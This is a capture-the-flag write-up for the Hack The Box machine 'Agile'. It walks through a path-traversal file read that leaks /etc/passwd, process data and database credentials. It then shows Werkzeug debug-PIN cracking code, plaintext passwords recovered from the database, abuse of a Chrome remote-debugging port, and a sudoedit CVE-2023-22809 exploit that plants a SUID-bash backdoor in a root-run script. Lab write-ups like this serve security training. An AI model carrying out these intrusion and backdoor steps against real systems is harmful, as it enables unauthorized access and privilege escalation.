---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Agile

## Enumeration

### nmap

```
Nmap scan report for agile.htb (10.129.193.183)
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web (80 TCP)

IP address redirects to `http://superpass.htb`.

Sometimes a SQLErroroccurs:

```
sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
FROM users 
WHERE users.username = %(username_1)s 
 LIMIT %(param_1)s]
[parameters: {'username_1': 'test2', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)
```

Cookies contain (base64->zlib inflate):

```
{"_flashes":[{" t":["message","Please log in to access this page."]}],"_fresh":true,"_id":"733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96","_user_id":"10"}
```

Nothing else so far.

## File inclusion

In `http://superpass.htb/vault`, there is a functionality to export passwords If we intercept the request in burp, we can see `GET /download?fn=razzmann_export_e60a12cd5a.csv HTTP/1.1` with fn being the file incluson parameter

Perfect, so sending `GET /download?fn=../../../etc/passwd HTTP/1.1` should do the trick.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Now to download some files.

### Source code

Tehere is the source code of the web `/app/app/superpass/app.py`

By going trgought the includes, we can create the whole map

```
app.py
services/user_service.py
services/password_service.py
services/utility_service.py
data/db_session.py
data/modelbase.py
data/user.py
data/password.py
infrastructure/view_modifiers.py
views/home_views.py
views/vault_views.py
views/account_views.py
```

There also is database config `config_prod.json:`

```
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

They are using SHA2-512, 200000 rounds for hashing passwords See: `../../app/app/superpass/services/user_service.py`

### Process data

With file inclusion, we can also inspect process data.

https://www.kernel.org/doc/html/latest/filesystems/proc.html

#### Environmnet variables

`/download?fn=../../proc/self/environ`

```
LANG=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/var/www
LOGNAME=www-data
USER=www-data
INVOCATION_ID=1c09eae88cc94edf91d8f27de2912c05
JOURNAL_STREAM=8:32747
SYSTEMD_EXEC_PID=1091
CONFIG_PATH=/app/config_prod.json
```

#### Cmdline

`/download?fn=../../proc/self/cmdline`

```
/app/venv/bin/python3
/app/venv/bin/gunicorn
--bind
127.0.0.1:5000
--threads=10
--timeout
600
wsgi:app
```

### Debug mode

Going back to the random error, by inspecting it, it is apparent that the site is in debug mode.

We can use it to access a console, but to do that we need PIN. Luckily, there is an exploit on how to crack it https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/

```python
username = "www-data"
probably_public_bits = [
	username,# username
	'flask.app',# modname
	'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'345050094972',# /sys/class/net/eth0/address 
	# Machine Id: /etc/machine-id + /proc/self/cgroup
    'ed5b159560f54721827644bc9b220d00superpass.service'
]
```

That will get you to www-data user.

## Escalate to USER

We can now use the database credentials to access the database. Log in to mysql database `mysql -h localhost -P 3306 -u superpassuser -p superpass` password is: dSA6l7q\*yIVs$39Ml6ywvgK `select * from passwords;` and then you can see the passwords in plaintext: like `corum:5db7caa1d13cc37c9fc2`

ssh and get the USER FLAG

## Escalate to ROOT

PSPY (process monitor) tells us that there is Chrome with debug port:

```
/bin/bash /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.R480G2 --window-size=1420,1080 data:,
```

Again, there is an exploit Just follow the guide: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/

In the end, you get a password for another user `edwards:d07867c6267dcb5df0af`

### Further escalation

`sudo -l` yields:

```
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit
        /app/app-testing/tests/functional/creds.txt
```

So we can call sudoedit on some files as dev_admin

Now check `sudo --version`:

```
edwards@agile:/root# sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Cool, because that is vulnerable. https://nvd.nist.gov/vuln/detail/CVE-2023-22809 It allows to append to any file as someone else.

The difference is that dont run `sudoedit` as root. I run it as dev_admin. Meaning, I can append as dev_admin, but not as root.

By executing `pspy64` I can see that root periodically executes `/app/venv/bin/activate`. The file is also writable as dev_admin. So, I can write backdoor there as dev_admin.

To exploit, run: `EDITOR='vim -- /app/venv/bin/activate' sudo -u dev_admin sudoedit /app/config_test.json` This will trick the `sudoedit` to open `/app/venv/bin/activate` instead of the correct `/app/config_test.json` as the unpatched `sudoedit` looks at `EDITOR` variable and its protection can be bypassed by `--` argument.

Now you can add your payload, e.g.:

```
# Adds SUID to /usr/bin/bash, running is as root
chmod u+s /usr/bin/bash

# Directly exfiltrates the flag.
# Don't forget to `touch /tmp/.razzman/file` before, oter2ise you cannot remove it (as root creates it).
cat /root/root.txt >> /tmp/.razzman/file

# Copy the bash to temp and add SUID to it (for better cleanup)
cp /bin/bash /tmp/.razzman/bash
chmod 4777 /tmp/.razzman/bash
```

Wait a bit and you get your flag. Then clean after yourself.